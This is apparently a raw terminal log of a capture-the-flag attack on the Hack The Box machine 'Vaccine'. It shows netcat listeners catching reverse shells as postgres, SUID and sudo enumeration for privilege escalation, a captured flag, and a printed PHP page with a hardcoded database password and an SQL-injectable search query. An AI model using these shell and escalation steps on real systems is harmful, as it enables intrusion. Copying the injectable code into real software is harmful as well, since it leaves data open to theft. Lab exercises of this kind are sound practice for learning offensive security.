+/snap/core/11316/usr/lib/snapd/snap-confine
+/snap/core/11316/usr/sbin/pppd
+postgres@vaccine:/var/lib/postgresql/11/main$ exit
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mnc[39m [32m-nlvp[39m  4444[?1l>[?2004l
+listening on [any] 4444 ...
+connect to [10.10.15.90] from (UNKNOWN) [10.129.11.144] 38024
+bash: cannot set terminal process group (45385): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ find / -perm -4000 2>/dev/null | xargs -I {} stat -c "%A %U %G %n" {} | awk '($2 == "username" || $3 == "mygroupname")'
+<} | awk '($2 == "username" || $3 == "mygroupname")'
+postgres@vaccine:/var/lib/postgresql/11/main$ id
+id
+uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+postgres@vaccine:/var/lib/postgresql/11/main$ find / -perm -4000 2>/dev/null | xargs -I {} stat -c "%A %U %G %n" {} | awk '($2 == "postgres" || $3 == "postgres")'
+<" {} | awk '($2 == "postgres" || $3 == "postgres")'
+postgres@vaccine:/var/lib/postgresql/11/main$ ^[[A \    find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/sudo
+/snap/core20/1169/usr/bin/chfn
+/snap/core20/1169/usr/bin/chsh
+/snap/core20/1169/usr/bin/gpasswd
+/snap/core20/1169/usr/bin/mount
+/snap/core20/1169/usr/bin/newgrp
+/snap/core20/1169/usr/bin/passwd
+/snap/core20/1169/usr/bin/su
+/snap/core20/1169/usr/bin/sudo
+/snap/core20/1169/usr/bin/umount
+/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1169/usr/lib/openssh/ssh-keysign
+/snap/core20/1081/usr/bin/chfn
+/snap/core20/1081/usr/bin/chsh
+/snap/core20/1081/usr/bin/gpasswd
+/snap/core20/1081/usr/bin/mount
+/snap/core20/1081/usr/bin/newgrp
+/snap/core20/1081/usr/bin/passwd
+/snap/core20/1081/usr/bin/su
+/snap/core20/1081/usr/bin/sudo
+/snap/core20/1081/usr/bin/umount
+/snap/core20/1081/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1081/usr/lib/openssh/ssh-keysign
+/snap/core/11743/bin/mount
+/snap/core/11743/bin/ping
+/snap/core/11743/bin/ping6
+/snap/core/11743/bin/su
+/snap/core/11743/bin/umount
+/snap/core/11743/usr/bin/chfn
+/snap/core/11743/usr/bin/chsh
+/snap/core/11743/usr/bin/gpasswd
+/snap/core/11743/usr/bin/newgrp
+/snap/core/11743/usr/bin/passwd
+/snap/core/11743/usr/bin/sudo
+/snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/11743/usr/lib/openssh/ssh-keysign
+/snap/core/11743/usr/lib/snapd/snap-confine
+/snap/core/11743/usr/sbin/pppd
+/snap/core/11316/bin/mount
+/snap/core/11316/bin/ping
+/snap/core/11316/bin/ping6
+/snap/core/11316/bin/su
+/snap/core/11316/bin/umount
+/snap/core/11316/usr/bin/chfn
+/snap/core/11316/usr/bin/chsh
+/snap/core/11316/usr/bin/gpasswd
+/snap/core/11316/usr/bin/newgrp
+/snap/core/11316/usr/bin/passwd
+/snap/core/11316/usr/bin/sudo
+/snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/11316/usr/lib/openssh/ssh-keysign
+/snap/core/11316/usr/lib/snapd/snap-confine
+/snap/core/11316/usr/sbin/pppd
+postgres@vaccine:/var/lib/postgresql/11/main$ ll /snap/core/11316/bin/su
+ll /snap/core/11316/bin/su
+ll: command not found
+postgres@vaccine:/var/lib/postgresql/11/main$ ls -l /snap/core/11316/bin/su
+ls -l /snap/core/11316/bin/su
+-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/11316/bin/su
+postgres@vaccine:/var/lib/postgresql/11/main$ exit
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mnc[39m [32m-nlvp[39m  4444[?1l>[?2004l
+listening on [any] 4444 ...
+bconnect to [10.10.15.90] from (UNKNOWN) [10.129.11.144] 38094
+bash: cannot set terminal process group (45669): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ find / -perm -4000 2>/dev/null | xargs -I {} ls -l {} 2>/dev/null | grep postgres
+
+< | xargs -I {} ls -l {} 2>/dev/null | grep postgres
+postgres@vaccine:/var/lib/postgresql/11/main$ 
+postgres@vaccine:/var/lib/postgresql/11/main$ ^[[A  ^[[A^[[A^[[A              sudo -ls ^[[1;5D            l ||    echo 
+sudo -l | echo 
+
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+postgres@vaccine:/var/lib/postgresql/11/main$ find / -type f -executable \( -user postgres -o -group postgres \) 2>/dev/null
+
+<\( -user postgres -o -group postgres \) 2>/dev/null
+postgres@vaccine:/var/lib/postgresql/11/main$ 
+postgres@vaccine:/var/lib/postgresql/11/main$ exit
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mnc[39m [32m-nlvp[39m  4444[?1l>[?2004l
+listening on [any] 4444 ...
+^C
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?1l>[?2004l
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?1l>[?2004l
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?1l>[?2004l
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mnc[39m [32m-nlvp[39m  4444[14D[36ml[36ms[39m [39m [39m [39m [39m [39m [2C    [12D[36mn[36mc[39m [32m-nlvp[39m  4444[?1l>[?2004l
+listening on [any] 4444 ...
+^[[A^[[B        connect to [10.10.15.90] from (UNKNOWN) [10.129.11.144] 38368
+bash: cannot set terminal process group (46014): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ ls    export TERM           lsd   ls -la 
+ls -la 
+total 92
+drwx------ 19 postgres postgres 4096 Oct 25 14:35 .
+drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 ..
+drwx------  6 postgres postgres 4096 Jul 23  2021 base
+drwx------  2 postgres postgres 4096 Oct 25 14:35 global
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_commit_ts
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_dynshmem
+drwx------  4 postgres postgres 4096 Oct 25 14:35 pg_logical
+drwx------  4 postgres postgres 4096 Jul 23  2021 pg_multixact
+drwx------  2 postgres postgres 4096 Oct 25 14:35 pg_notify
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_replslot
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_serial
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_snapshots
+drwx------  2 postgres postgres 4096 Oct 25 14:35 pg_stat
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_stat_tmp
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_subtrans
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_tblspc
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_twophase
+-rw-------  1 postgres postgres    3 Feb  3  2020 PG_VERSION
+drwx------  3 postgres postgres 4096 Jul 23  2021 pg_wal
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_xact
+-rw-------  1 postgres postgres   88 Feb  3  2020 postgresql.auto.conf
+-rw-------  1 postgres postgres  130 Oct 25 14:35 postmaster.opts
+-rw-------  1 postgres postgres  109 Oct 25 14:35 postmaster.pid
+postgres@vaccine:/var/lib/postgresql/11/main$ ls  l ls
+ls
+base
+global
+pg_commit_ts
+pg_dynshmem
+pg_logical
+pg_multixact
+pg_notify
+pg_replslot
+pg_serial
+pg_snapshots
+pg_stat
+pg_stat_tmp
+pg_subtrans
+pg_tblspc
+pg_twophase
+PG_VERSION
+pg_wal
+pg_xact
+postgresql.auto.conf
+postmaster.opts
+postmaster.pid
+postgres@vaccine:/var/lib/postgresql/11/main$ ^[[A^[[A        ls 0kla   l  l -la 
+ls -la 
+total 92
+drwx------ 19 postgres postgres 4096 Oct 25 14:35 .
+drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 ..
+drwx------  6 postgres postgres 4096 Jul 23  2021 base
+drwx------  2 postgres postgres 4096 Oct 25 14:36 global
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_commit_ts
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_dynshmem
+drwx------  4 postgres postgres 4096 Oct 25 14:35 pg_logical
+drwx------  4 postgres postgres 4096 Jul 23  2021 pg_multixact
+drwx------  2 postgres postgres 4096 Oct 25 14:35 pg_notify
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_replslot
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_serial
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_snapshots
+drwx------  2 postgres postgres 4096 Oct 25 14:35 pg_stat
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_stat_tmp
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_subtrans
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_tblspc
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_twophase
+-rw-------  1 postgres postgres    3 Feb  3  2020 PG_VERSION
+drwx------  3 postgres postgres 4096 Jul 23  2021 pg_wal
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_xact
+-rw-------  1 postgres postgres   88 Feb  3  2020 postgresql.auto.conf
+-rw-------  1 postgres postgres  130 Oct 25 14:35 postmaster.opts
+-rw-------  1 postgres postgres  109 Oct 25 14:35 postmaster.pid
+postgres@vaccine:/var/lib/postgresql/11/main$ cd ..
+cd ..
+postgres@vaccine:/var/lib/postgresql/11$ c cd   ls  ls     l;s  s 
+ls 
+main
+postgres@vaccine:/var/lib/postgresql/11$ cd ..
+cd ..
+postgres@vaccine:/var/lib/postgresql$ ls
+ls
+11
+user.txt
+postgres@vaccine:/var/lib/postgresql$ vat   cat user	.ty  txt
+cat user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7
+postgres@vaccine:/var/lib/postgresql$ d cd /etc
+cd /etc
+postgres@vaccine:/etc$ cd sudoert  t rs
+cd sudoers
+bash: cd: sudoers: Not a directory
+postgres@vaccine:/etc$ ls
+ls
+adduser.conf
+alternatives
+apache2
+apparmor
+apparmor.d
+apport
+apt
+at.deny
+bash.bashrc
+bash_completion
+bash_completion.d
+bindresvport.blacklist
+binfmt.d
+byobu
+ca-certificates
+ca-certificates.conf
+ca-certificates.conf.dpkg-old
+calendar
+cloud
+console-setup
+cron.d
+cron.daily
+cron.hourly
+cron.monthly
+crontab
+cron.weekly
+cryptsetup-initramfs
+crypttab
+dbus-1
+dconf
+debconf.conf
+debian_version
+default
+deluser.conf
+depmod.d
+dhcp
+dpkg
+e2scrub.conf
+environment
+fonts
+fstab
+ftpusers
+fuse.conf
+fwupd
+gai.conf
+groff
+group
+group-
+grub.d
+gshadow
+gshadow-
+gss
+hdparm.conf
+host.conf
+hostname
+hosts
+hosts.allow
+hosts.deny
+init.d
+initramfs-tools
+inputrc
+iproute2
+iscsi
+issue
+issue.net
+kernel
+kernel-img.conf
+landscape
+ldap
+ld.so.cache
+ld.so.conf
+ld.so.conf.d
+legal
+libaudit.conf
+libnl-3
+locale.alias
+locale.gen
+localtime
+logcheck
+login.defs
+logrotate.conf
+logrotate.d
+lsb-release
+ltrace.conf
+lvm
+machine-id
+magic
+magic.mime
+mailcap
+mailcap.order
+manpath.config
+mdadm
+mime.types
+mke2fs.conf
+modprobe.d
+modules
+modules-load.d
+mtab
+multipath.conf
+nanorc
+network
+networkd-dispatcher
+NetworkManager
+networks
+newt
+nsswitch.conf
+opt
+os-release
+overlayroot.conf
+PackageKit
+pam.conf
+pam.d
+passwd
+passwd-
+perl
+php
+pki
+pm
+polkit-1
+pollinate
+popularity-contest.conf
+postgresql
+postgresql-common
+profile
+profile.d
+protocols
+python3
+python3.7
+rc0.d
+rc1.d
+rc2.d
+rc3.d
+rc4.d
+rc5.d
+rc6.d
+rcS.d
+resolv.conf
+rmt
+rpc
+rsyslog.conf
+rsyslog.d
+screenrc
+securetty
+security
+selinux
+sensors3.conf
+sensors.d
+services
+shadow
+shadow-
+shells
+skel
+sos.conf
+ssh
+ssl
+subgid
+subgid-
+subuid
+subuid-
+sudo.conf
+sudoers
+sudoers.d
+sudoers.dpkg-old
+sysctl.conf
+sysctl.d
+sysstat
+systemd
+terminfo
+thermald
+timezone
+tmpfiles.d
+ubuntu-advantage
+ucf.conf
+udev
+ufw
+update-manager
+update-motd.d
+update-notifier
+vim
+vmware-tools
+vsftpd.conf
+vsftpd.conf.bak
+vsftpd.conf.save
+vsftpd.userlist
+vtrgb
+wgetrc
+X11
+xattr.conf
+xdg
+zsh_command_not_found
+postgres@vaccine:/etc$ pth  yho  rhon    thon 
+python 
+
+Command 'python' not found, but can be installed with:
+
+apt install python3         # version 3.7.5-1, or
+apt install python          # version 2.7.17-1
+apt install python-minimal  # version 2.7.17-1
+
+Ask your administrator to install one of them.
+
+You also have python3 installed, you can run 'python3' instead.
+
+postgres@vaccine:/etc$ cd /va ar/www/html 
+cd /var/www/html 
+postgres@vaccine:/var/www/html$ ks
+ks
+ks: command not found
+postgres@vaccine:/var/www/html$ ls
+ls
+bg.png
+dashboard.css
+dashboard.js
+dashboard.php
+index.php
+license.txt
+style.css
+postgres@vaccine:/var/www/html$ cat l   ds asg	  shboard.php
+cat dashboard.php
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="./dashboard.css">
+  <script src="https://use.fontawesome.com/33a3739634.js"></script>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<body>
+ <div id="wrapper">
+ <div class="parent">
+  <h1 align="left">MegaCorp Car Catalogue</h1>
+<form action="" method="GET">
+<div class="search-box">
+  <input type="search" name="search" placeholder="Search" />
+  <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
+</div>
+</form>
+  </div>
+  
+  <table id="keywords" cellspacing="0" cellpadding="0">
+    <thead>
+      <tr>
+        <th><span style="color: white">Name</span></th>
+        <th><span style="color: white">Type</span></th>
+        <th><span style="color: white">Fuel</span></th>
+        <th><span style="color: white">Engine</span></th>
+      </tr>
+    </thead>
+    <tbody>
+	<?php
+	session_start();
+	if($_SESSION['login'] !== "true") {
+	  header("Location: index.php");
+	  die();
+	}
+	try {
+	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+	}
+
+	catch ( exception $e ) {
+	  echo $e->getMessage();
+	}
+
+	if(isset($_REQUEST['search'])) {
+
+	  $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
+
+	  $result = pg_query($conn,$q);
+
+	  if (!$result)
+	  {
+			    die(pg_last_error($conn));
+	  }
+	  while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+	      {
+		echo "
+		  <tr>
+		    <td class='lalign'>$row[1]</td>
+		    <td>$row[2]</td>
+		    <td>$row[3]</td>
+		    <td>$row[4]</td>
+		  </tr>";
+	    }
+	}
+	else {
+		
+	  $q = "Select * from cars";
+
+	  $result = pg_query($conn,$q);
+
+	  if (!$result)
+	  {
+			    die(pg_last_error($conn));
+	  }
+	  while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+	      {
+		echo "
+		  <tr>
+		    <td class='lalign'>$row[1]</td>
+		    <td>$row[2]</td>
+		    <td>$row[3]</td>
+		    <td>$row[4]</td>
+		  </tr>";
+	    }
+	}
+
+
+      ?>
+    </tbody>
+  </table>
+ </div> 
+</body>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="./dashboard.js"></script>
+
+</body>
+</html>
+postgres@vaccine:/var/www/html$ ^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[B^[[B^[[B                                                ^C
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4me[24m[4me[24m[38;2;153;153;153mxit[39m[24m[36me[36mx[39m[39m[4me[39m[4mx[39m[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+
+Script done on 2024-10-25 10:39:22-04:00 [COMMAND_EXIT_CODE="130"]
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mcat[39m [1mshell_session.log[0m| less [28D[36mt[36ma[36mi[39ml[1m [1ms[1mh[1me[1ml[1ml[1m_[1ms[1me[1ms[1ms[1mi[1mo[1mn[1m.[1ml[1mo[0mg     [20D[36mi[36ml[39m[0m [12C[1mn[0m[0m [0m [0m  [18D[36mv[36mi[36mm[36m [39ms[P[11C[1mn[1m.[0mlog[21D[36mt[36ma[36mi[36ml[39m [1ms[1mh[1me[1ml[1ml[1m_[1ms[1me[1ms[1ms[1mi[1mo[1mn[0m   [18D[36me[36mx[36mi[36mt[39m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [14D[36mn[36mc[36m [36m-[39mnlvp  4444[14D[36ml[36ms[39m[39m [39m     [2C    [12D[36me[36mx[36mit[39m[36ml[36ms[39m[39m [39m [36me[36mx[36mit[39m[36mi[36mp[39m[39m [39maM[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [36mip[39m a[?1l>[?2004l
+1: [1;36mlo: [0m<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback [1;33m00:00:00:00:00:00[0m brd [1;33m00:00:00:00:00:00[0m
+    inet [1;35m127.0.0.1[0m/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 [1;34m::1[0m/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: [1;36meth0: [0m<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state [1;32mUP [0mgroup default qlen 1000
+    link/ether [1;33m00:11:22:33:44:55[0m brd [1;33mff:ff:ff:ff:ff:ff[0m
+    inet [1;35m192.168.1.141[0m/24 brd [1;35m192.168.1.255 [0mscope global dynamic eth0
+       valid_lft 577952sec preferred_lft 577952sec
+    inet6 [1;34m2a0d:6fc2:4f70:d200:211:22ff:fe33:4455[0m/64 scope global dynamic mngtmpaddr proto kernel_ra 
+       valid_lft 171271sec preferred_lft 171271sec
+    inet6 [1;34mfe80::211:22ff:fe33:4455[0m/64 scope link proto kernel_ll 
+       valid_lft forever preferred_lft forever
+3: [1;36meth1: [0m<BROADCAST,MULTICAST> mtu 1500 qdisc noop state [1;31mDOWN [0mgroup default qlen 1000
+    link/ether [1;33m00:0c:29:e5:35:87[0m brd [1;33mff:ff:ff:ff:ff:ff[0m
+5: [1;36mtun0: [0m<POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet [1;35m10.10.15.90[0m/23 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 [1;34mdead:beef:2::1158[0m/64 scope global 
+       valid_lft forever preferred_lft forever
+    inet6 [1;34mfe80::f398:4eb5:721a:ef3[0m/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+                                                                                                                             
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[1m[31m][0m[24m[39m[1m[31m][0m[24m[39m[38;2;153;153;153mls[39m[1m[31m][0m[24m[39m[39m [39m [?1l>[?2004l
+]: command not found
+                                                                                                                             
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?1l>[?2004l
+                                                                                                                             
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36ml[39m[36ml[39m[38;2;153;153;153ms[39m[39m [39m [1mn[0m[1mn[0m[38;2;153;153;153mc -nlvp  4444[39m[13D[0m[36mn[36mm[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153map -T5 -sC -sV vaccine.htb -oN nmap.txt[39m[39D[39m[1mn[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [40D[1mn[0m[38;2;153;153;153mc -nlvp  4444[39m[13D[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[1m[31m][0m[24m[39m[0m[36mi[36mp[39m a[36mc[36ma[36mt[39m [1mshell_session.log[0m[1m[34m|[0m[39m [36mless[39m [28D[36mt[36ma[36mi[36ml[39m[0m [1ms[1mh[1me[1ml[1ml[1m_[1ms[1me[1ms[1ms[1mi[1mo[1mn[1m.[1ml[1mo[39m[1mg[0m [39m [39m [39m [39m [1mo[0m[0m [38;2;153;153;153mg[39m[1ml[0m[0m [39m [38;2;153;153;153mog[39m[1m.[0m[0m [39m [39m [38;2;153;153;153mlog[39m[1mn[0m[0m [39m [39m [39m [38;2;153;153;153m.log[39m[1mo[0m[0m [39m [39m [39m [39m [38;2;153;153;153mn.log[39m[1mi[0m[0m [39m [39m [39m [39m [39m [38;2;153;153;153mon.log[39m[1ms[0m[0m [39m [39m [39m [39m [39m [39m [38;2;153;153;153mion.log[39m[1ms[0m[0m [39m [39m [39m [39m [39m [39m [39m [8D[38;2;153;153;153msion.log[39m[8D[1me[0m[0m [39m [39m [39m [39m [39m [39m [39m [39m [9D[38;2;153;153;153mssion.log[39m[9D[1ms[0m[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[38;2;153;153;153mession.log[39m[10D[1m_[0m[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[38;2;153;153;153msession.log[39m[11D[1ml[0m[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153m_session.log[39m[12D[1ml[0m[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [13D[38;2;153;153;153ml_session.log[39m[13D[1me[0m[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153mll_session.log[39m[14D[1mh[0m[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[38;2;153;153;153mell_session.log[39m[15D[1ms[0m[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[38;2;153;153;153mhell_session.log[39m[16D[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [17D[38;2;153;153;153mshell_session.log[39m[17D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [18D[38;2;153;153;153m shell_session.log[39m[18D[39m[4mt[39m[4ma[39m[4mi[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[38;2;153;153;153ml shell_session.log[39m[19D[4mt[4ma[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [20D[38;2;153;153;153mil shell_session.log[39m[20D[4mt[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [21D[4mt[24m[38;2;153;153;153mail shell_session.log[39m[21D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [22D[1mn[0m[1mn[0m[38;2;153;153;153mc -nlvp  4444[39m[13D[0m[36mn[36mc[39m[39m [32m-[39m[32m-[32mn[32ml[32mv[32mp[39m[39m [39m [39m4[39m4[39m4[39m4[?1l>[?2004l
+listening on [any] 4444 ...
+^X^X    ^C
+                                                                                                                             
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4me[24m[4me[24m[38;2;153;153;153mxit[39m[24m[36me[36mx[39m[39m[4me[39m[4mx[39m[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+
+Script done on 2024-10-25 12:05:12-04:00 [COMMAND_EXIT_CODE="1"]
